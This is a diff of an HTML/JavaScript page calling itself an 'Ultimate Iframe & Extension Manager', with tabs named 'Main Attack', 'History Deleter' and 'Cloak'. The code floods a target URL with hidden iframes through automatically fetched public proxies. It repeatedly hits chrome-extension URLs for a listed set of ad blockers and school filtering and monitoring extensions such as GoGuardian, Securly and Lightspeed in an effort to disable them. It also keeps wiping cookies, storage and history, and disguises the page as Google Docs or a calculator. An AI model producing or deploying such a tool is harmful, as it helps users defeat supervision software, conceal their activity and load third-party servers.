@@ -1,253 +1,322 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Ultimate Iframe + Extension Manager</title>
-<style>
-  body {
-    background: #000;
-    color: #0f0;
-    font-family: 'Arial', sans-serif;
-    margin: 0;
-    padding: 20px;
-    overflow-x: hidden;
-  }
-  h1, h2 {
-    text-align: center;
-    color: #0f0;
-  }
-  .container {
-    max-width: 1000px;
-    margin: auto;
-    background: #111;
-    padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px #0f0;
-  }
-  label, select, input, button, textarea {
-    display: block;
-    width: 100%;
-    margin-top: 10px;
-    padding: 10px;
-    background: #222;
-    color: #0f0;
-    border: 1px solid #0f0;
-    border-radius: 5px;
-  }
-  button {
-    cursor: pointer;
-    background: #0f0;
-    color: #000;
-    font-weight: bold;
-  }
-  button:hover {
-    background: #0c0;
-  }
-  .scrollable {
-    max-height: 150px;
-    overflow-y: auto;
-  }
-  .status {
-    margin-top: 20px;
-    text-align: center;
-    font-weight: bold;
-  }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Ultimate Iframe & Extension Manager</title>
+  <style>
+    body { background: #000; color: #0f0; font-family: monospace; margin:0; padding:0; }
+    .header { display:flex; background:#111; padding:10px; }
+    .tablink { flex:1; background:#111; border:none; color:#0f0; padding:10px; cursor:pointer; }
+    .tablink.active { background:#0c0; color:#000; }
+    .tabcontent { display:none; padding:20px; }
+    .container { max-width:900px; margin:auto; }
+    label,input,select,button,textarea,progress {
+      width:100%; margin-top:10px; padding:8px;
+      background:#222; color:#0f0; border:1px solid #0f0; border-radius:4px;
+    }
+    button { font-weight:bold; background:#0f0; color:#000; cursor:pointer; }
+    button:hover { background:#0c0; }
+    .scrollable { max-height:150px; overflow-y:auto; }
+    .status { margin-top:10px; font-weight:bold; text-align:center; }
+    #safeExitBtn {
+      position:fixed; top:10px; right:10px;
+      background:#f00; color:#fff; border:none; padding:8px; border-radius:4px;
+      z-index:999;
+    }
+  </style>
 </head>
 <body>
 
-<h1>Ultimate Iframe + Extension Manager</h1>
+<button id="safeExitBtn" onclick="safeExit()">Safe Exit</button>
 
-<div class="container">
-  <h2>Flood Settings</h2>
+<div class="header">
+  <button class="tablink active" onclick="openTab('main')">Main Attack</button>
+  <button class="tablink" onclick="openTab('history')">History Deleter</button>
+  <button class="tablink" onclick="openTab('cloak')">Cloak</button>
+</div>
 
-  <label>Target URL</label>
-  <input type="text" id="targetUrl" value="https://example.com">
+<!-- MAIN ATTACK TAB -->
+<div id="main" class="tabcontent" style="display:block;">
+  <div class="container">
+    <h2>Flood & Extension Killer</h2>
 
-  <label>Number of Iframes</label>
-  <input type="number" id="iframeCount" value="50" min="1">
+    <label>Target URL</label>
+    <input type="text" id="targetUrl" value="https://example.com">
 
-  <label>Delay Between Iframes (ms)</label>
-  <input type="number" id="iframeDelay" value="100" min="0">
+    <label>Number of Iframes (cycles)</label>
+    <input type="number" id="iframeCount" value="100" min="1">
 
-  <label>Flood Mode</label>
-  <select id="floodMode">
-    <option value="aggressive">Ultra Aggressive</option>
-    <option value="balanced">Balanced</option>
-    <option value="silent">Silent Hidden</option>
-  </select>
+    <label>Delay Between Iframes (ms) (0 = Turbo)</label>
+    <input type="number" id="iframeDelay" value="50" min="0">
 
-  <h2>Extension Kill Settings</h2>
+    <label>Flood Mode</label>
+    <select id="floodMode">
+      <option value="aggressive">Ultra Aggressive</option>
+      <option value="balanced">Balanced</option>
+      <option value="silent">Silent Hidden</option>
+    </select>
 
-  <label>Select Extensions to Target</label>
-  <div class="scrollable">
-    <select id="extensionDropdown" multiple></select>
+    <label>Select Extensions to Attack</label>
+    <div class="scrollable">
+      <select id="extensionDropdown" multiple></select>
+    </div>
+
+    <label>Manually Add Extension ID</label>
+    <input type="text" id="manualExtensionId" placeholder="ID…">
+    <button onclick="addManualExtension()">Add Extension</button>
+    <button onclick="scanExtensions()">Scan Installed Extensions</button>
+
+    <h3>Proxy Settings (Auto-Fetch)</h3>
+    <button onclick="fetchProxies()">Fetch Proxies</button>
+    <div class="status" id="proxyStatus">Proxies loaded: 0</div>
+    <label><input type="checkbox" id="enableProxyRotate" checked> Enable Proxy Rotation</label>
+    <label><input type="checkbox" id="randomProxy" checked> Randomize Proxy Order</label>
+
+    <h3>Optional Features</h3>
+    <label><input type="checkbox" id="autoSelectBlockers" checked> Auto-Select Known Blockers</label>
+    <label><input type="checkbox" id="smartRetry" checked> Enable Smart Retry</label>
+    <label><input type="checkbox" id="showProgress" checked> Show Progress Bar</label>
+
+    <h3>Controls</h3>
+    <button onclick="startFlood()">Start Attack</button>
+    <button onclick="stopFlood()">Stop Attack</button>
+    <button onclick="killSwitch()">Kill Switch</button>
+
+    <div id="progressContainer" style="display:none;">
+      <progress id="attackProgress" value="0" max="100"></progress>
+    </div>
+    <div class="status" id="statusMain">Status: Idle</div>
   </div>
+</div>
 
-  <label>Manually Add Extension ID</label>
-  <input type="text" id="manualExtensionId" placeholder="Extension ID">
+<!-- HISTORY DELETER TAB -->
+<div id="history" class="tabcontent">
+  <div class="container">
+    <h2>History Deleter</h2>
+    <p>This will attempt every strategy to clear browsing history, cookies, storage, and force browser prompt.</p>
+    <button onclick="deleteHistory()">Delete All History</button>
+    <button onclick="stopHistoryDeletion()">Stop Attempts</button>
+    <div class="status" id="statusHistory">Status: Idle</div>
+  </div>
+</div>
 
-  <button onclick="addManualExtension()">Add Extension</button>
-
-  <h2>Proxy Settings</h2>
-
-  <label>Proxy List (one per line)</label>
-  <textarea id="proxyList" placeholder="http://proxy1.com
-http://proxy2.com"></textarea>
-
-  <label>Enable Proxy Websurf and Rotation</label>
-  <input type="checkbox" id="enableProxyRotate" checked>
-
-  <h2>Controls</h2>
-
-  <button onclick="startFlood()">Start Attack</button>
-  <button onclick="stopFlood()">Stop Attack</button>
-  <button onclick="killSwitch()">Kill Switch</button>
-
-  <div class="status" id="status">Status: Idle</div>
+<!-- CLOAK TAB -->
+<div id="cloak" class="tabcontent">
+  <div class="container">
+    <h2>Cloak Disguise</h2>
+    <label>Cloak Mode</label>
+    <select id="cloakMode">
+      <option value="google-docs">Fake Google Docs</option>
+      <option value="google-drive">Fake Google Drive</option>
+      <option value="calculator">Fake Calculator</option>
+      <option value="notepad">Fake Notepad</option>
+      <option value="blank">Blank Page</option>
+      <option value="custom">Custom URL</option>
+    </select>
+    <input type="text" id="cloakCustomUrl" placeholder="https://… (for Custom)">
+    <button onclick="applyCloak()">Apply Cloak</button>
+  </div>
 </div>
 
 <script>
-let flooding = false;
-let proxyIndex = 0;
-let proxies = [];
-let iframeInterval;
-let frameCounter = 0;
-let extensionList = [
-  "gighmmpiobklfepjocnamgkkbiglidom", // AdBlock
-  "cfhdojbkjhnklbpkdaibdccddilifddb", // Adblock Plus
-  "nkeimhogjdpnpccoofpliimaahmaaome", // Grammarly
-  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // uBlock Origin
-  "lfnaojkojhopbjbpmloofpnjkcjnkddd", // Iboss Client
-  // Add more known extension IDs here
-];
-
-function populateDropdown() {
-  const dropdown = document.getElementById('extensionDropdown');
-  extensionList.forEach(id => {
-    const option = document.createElement('option');
-    option.value = id;
-    option.textContent = id;
-    dropdown.appendChild(option);
-  });
-}
-
-function addManualExtension() {
-  const id = document.getElementById('manualExtensionId').value.trim();
-  if (id) {
-    extensionList.push(id);
-    const dropdown = document.getElementById('extensionDropdown');
-    const option = document.createElement('option');
-    option.value = id;
-    option.textContent = id;
-    dropdown.appendChild(option);
-    document.getElementById('manualExtensionId').value = '';
-  }
-}
-
-function startFlood() {
-  if (flooding) return;
-  flooding = true;
-  proxies = document.getElementById('proxyList').value.split('\n').map(p => p.trim()).filter(p => p);
-  proxyIndex = 0;
-  frameCounter = 0;
-  document.getElementById('status').innerText = "Status: Flooding...";
-  attackLoop();
-}
-
-function stopFlood() {
-  flooding = false;
-  clearInterval(iframeInterval);
-  document.getElementById('status').innerText = "Status: Stopped.";
-}
-
-function attackLoop() {
-  const url = document.getElementById('targetUrl').value;
-  const iframeCount = parseInt(document.getElementById('iframeCount').value);
-  const delay = parseInt(document.getElementById('iframeDelay').value);
-  const mode = document.getElementById('floodMode').value;
-  const useProxies = document.getElementById('enableProxyRotate').checked;
-
-  let activeExtensions = Array.from(document.getElementById('extensionDropdown').selectedOptions).map(opt => opt.value);
-
-  iframeInterval = setInterval(() => {
-    if (!flooding) {
-      clearInterval(iframeInterval);
-      return;
-    }
-    if (frameCounter >= iframeCount) {
-      clearInterval(iframeInterval);
-      document.getElementById('status').innerText = "Status: Done.";
-      return;
-    }
-    spawnIframe(url, mode, useProxies);
-    attackExtensions(activeExtensions);
-    frameCounter++;
-  }, delay);
-}
-
-function spawnIframe(url, mode, useProxies) {
-  const iframe = document.createElement('iframe');
-  let fullUrl = url;
-  
-  if (useProxies && proxies.length > 0) {
-    fullUrl = proxies[proxyIndex % proxies.length] + "/" + url;
-    proxyIndex++;
+  // --- TAB SWITCHING ---
+  function openTab(id) {
+    document.querySelectorAll('.tabcontent').forEach(tc => tc.style.display = 'none');
+    document.querySelectorAll('.tablink').forEach(tb => tb.classList.remove('active'));
+    document.getElementById(id).style.display = 'block';
+    event.currentTarget.classList.add('active');
   }
 
-  iframe.src = fullUrl;
-  iframe.style.border = "none";
-
-  switch (mode) {
-    case 'aggressive':
-      iframe.style.width = "1px";
-      iframe.style.height = "1px";
-      break;
-    case 'balanced':
-      iframe.style.width = "10px";
-      iframe.style.height = "10px";
-      break;
-    case 'silent':
-      iframe.style.width = "0";
-      iframe.style.height = "0";
-      iframe.style.visibility = "hidden";
-      break;
+  // --- SAFE EXIT ---
+  function safeExit() {
+    // stop everything & reload
+    killSwitch(); stopFlood(); stopHistoryDeletion();
+    window.location.reload();
   }
 
-  document.body.appendChild(iframe);
+  // --- PROXY FETCH & STORAGE ---
+  let proxies = [];
+  function fetchProxies() {
+    document.getElementById('proxyStatus').innerText = 'Fetching…';
+    fetch('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all')
+      .then(r => r.text())
+      .then(txt => {
+        proxies = txt.split('\n').map(p=>p.trim()).filter(p=>p);
+        document.getElementById('proxyStatus').innerText = 'Proxies loaded: ' + proxies.length;
+      })
+      .catch(err=>{
+        console.error(err);
+        document.getElementById('proxyStatus').innerText = 'Proxy fetch failed';
+      });
+  }
 
-  iframe.onload = () => {
-    if (!flooding) iframe.remove();
+  // --- EXTENSION LIST & MAPPING ---
+  let extensionList = {
+    "gighmmpiobklfepjocnamgkkbiglidom":"AdBlock",
+    "cfhdojbkjhnklbpkdaibdccddilifddb":"AdblockPlus",
+    "nkeimhogjdpnpccoofpliimaahmaaome":"Grammarly",
+    "ibnejdfjmmkpcnlpebklmnkoeoihofec":"uBlockOrigin",
+    "lfnaojkojhopbjbpmloofpnjkcjnkddd":"IbossClient",
+    "jmfikkaemlgljjhmmokfnpgbjjmgkjin":"GoGuardian",
+    "pmcmeagblkinmogikoikkdjiligflglb":"Securly",
+    "ndcpmkhdnemgjbjgjpgeieibfaaooblj":"Blocksi",
+    "dklfdjmcoelnopogcfbglboogcgpjbfi":"Lightspeed",
+    "ldnnhddmnhbkjipkidpdiheffobcpfmf":"Hapara"
   };
+  function populateDropdown() {
+    const dd = document.getElementById('extensionDropdown');
+    dd.innerHTML = '';
+    for(let id in extensionList){
+      const opt = document.createElement('option');
+      opt.value=id;
+      opt.textContent=extensionList[id]+' ('+id+')';
+      dd.appendChild(opt);
+    }
+  }
+  function addManualExtension(){
+    const id=document.getElementById('manualExtensionId').value.trim();
+    if(id && !extensionList[id]){
+      extensionList[id]='Unknown';
+      populateDropdown();
+      document.getElementById('manualExtensionId').value='';
+    }
+  }
+  function scanExtensions(){
+    for(let id in extensionList){
+      const iframe=document.createElement('iframe');
+      iframe.src=`chrome-extension://${id}/_generated_background_page.html`;
+      iframe.style.display='none';
+      document.body.appendChild(iframe);
+      iframe.onload=()=>{ 
+        // if it loads, leave it in dropdown
+        iframe.remove();
+      };
+      setTimeout(()=>iframe.remove(),1000);
+    }
+  }
 
-  // Self-healing if iframe killed
-  iframe.onerror = () => {
-    if (flooding) spawnIframe(url, mode, useProxies);
-  };
-}
+  // --- ATTACK ENGINE ---
+  let flooding=false, iframeInterval, frameCounter=0;
+  function startFlood(){
+    if(flooding) return;
+    flooding=true; frameCounter=0;
+    const count = +document.getElementById('iframeCount').value;
+    const delay= +document.getElementById('iframeDelay').value;
+    const mode = document.getElementById('floodMode').value;
+    const smart = document.getElementById('smartRetry').checked;
+    const rotate = document.getElementById('enableProxyRotate').checked;
+    const randomP = document.getElementById('randomProxy').checked;
+    let exts = Array.from(document.getElementById('extensionDropdown').selectedOptions).map(o=>o.value);
+    if(!exts.length){ alert('Select at least one extension!'); flooding=false; return; }
+    document.getElementById('statusMain').innerText='Status: Flooding…';
+    if(randomP) proxies.sort(()=>Math.random()-0.5);
+    iframeInterval = setInterval(()=>{
+      if(!flooding||frameCounter>=count){ stopFlood(); return; }
+      // one iframe to target URL
+      spawnIframe(document.getElementById('targetUrl').value,mode,rotate,smart);
+      // one per extension
+      exts.forEach(id=>spawnExtIframe(id));
+      frameCounter++;
+      if(document.getElementById('showProgress').checked){
+        document.getElementById('progressContainer').style.display='block';
+        document.getElementById('attackProgress').value = (frameCounter/count)*100;
+      }
+    }, delay);
+  }
+  function stopFlood(){
+    flooding=false; clearInterval(iframeInterval);
+    document.getElementById('statusMain').innerText='Status: Stopped.';
+    document.getElementById('progressContainer').style.display='none';
+  }
+  function killSwitch(){
+    stopFlood();
+    document.querySelectorAll('iframe').forEach(f=>f.remove());
+    document.getElementById('statusMain').innerText='Status: Killed.';
+  }
+  function spawnIframe(url,mode,rotate,smart){
+    let proxy='';
+    if(rotate && proxies.length){
+      proxy = proxies[Math.floor(Math.random()*proxies.length)] + '/';
+    }
+    const src = proxy + url + '?r=' + Math.random();
+    const f = document.createElement('iframe');
+    f.src=src; f.style.border='none';
+    switch(mode){
+      case 'aggressive': f.style.width='1px'; f.style.height='1px'; break;
+      case 'balanced': f.style.width='10px'; f.style.height='10px'; break;
+      case 'silent': f.style.width='0'; f.style.height='0'; f.style.visibility='hidden'; break;
+    }
+    document.body.appendChild(f);
+    f.onload=()=>{ if(!flooding) f.remove(); };
+    f.onerror=()=>{ f.remove(); if(flooding && smart) spawnIframe(url,mode,rotate,smart); };
+  }
+  function spawnExtIframe(id){
+    const f=document.createElement('iframe');
+    f.style.display='none'; f.src=`chrome-extension://${id}/`;
+    document.body.appendChild(f);
+    setTimeout(()=>f.remove(),500);
+  }
 
-function attackExtensions(extensionIDs) {
-  extensionIDs.forEach(id => {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = `chrome-extension://${id}/`;
-    document.body.appendChild(iframe);
+  // --- HISTORY DELETER ---
+  let historyInterval;
+  function deleteHistory(){
+    stopHistoryDeletion();
+    document.getElementById('statusHistory').innerText='Status: Deleting…';
+    // immediate clears
+    clearAllData();
+    // schedule repeats
+    historyInterval = setInterval(clearAllData,500);
+  }
+  function stopHistoryDeletion(){
+    clearInterval(historyInterval);
+    document.getElementById('statusHistory').innerText='Status: Idle';
+  }
+  function clearAllData(){
+    // cookies
+    document.cookie.split(';').forEach(c=>{
+      document.cookie = c.replace(/^ +/,'').replace(/=.*/,'')+'=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/';
+    });
+    // storage
+    localStorage.clear(); sessionStorage.clear();
+    // browsingData API
+    try{
+      chrome.browsingData.remove({},{
+        history:true, cookies:true, localStorage:true, cache:true
+      },()=>{});
+    }catch(e){}
+    // open clear dialog
+    const fi=document.createElement('iframe');
+    fi.style.display='none'; fi.src='chrome://settings/clearBrowserData';
+    document.body.appendChild(fi);
+    setTimeout(()=>fi.remove(),2000);
+  }
 
-    setTimeout(() => {
-      iframe.remove();
-    }, 500);
-  });
-}
+  // --- CLOAK ---
+  function applyCloak(){
+    const mode = document.getElementById('cloakMode').value;
+    const url  = document.getElementById('cloakCustomUrl').value.trim();
+    switch(mode){
+      case 'google-docs': window.location.href='https://docs.google.com/document/u/0/'; break;
+      case 'google-drive': window.location.href='https://drive.google.com/drive/my-drive'; break;
+      case 'calculator':
+        document.body.innerHTML='<iframe src="https://www.google.com/search?q=calculator" style="border:none;width:100%;height:100vh;"></iframe>';
+        break;
+      case 'notepad':
+        document.body.innerHTML='<textarea style="width:100%;height:100vh;background:#fff;color:#000;"></textarea>';
+        break;
+      case 'blank':
+        document.body.innerHTML='';
+        break;
+      case 'custom':
+        if(url) window.location.href=url;
+        break;
+    }
+  }
 
-function killSwitch() {
-  flooding = false;
-  clearInterval(iframeInterval);
-  Array.from(document.querySelectorAll('iframe')).forEach(iframe => iframe.remove());
-  document.getElementById('status').innerText = "Status: Emergency Kill Activated.";
-}
-
-populateDropdown();
+  // --- INIT ---
+  populateDropdown();
+  fetchProxies();
 </script>
 
 </body>
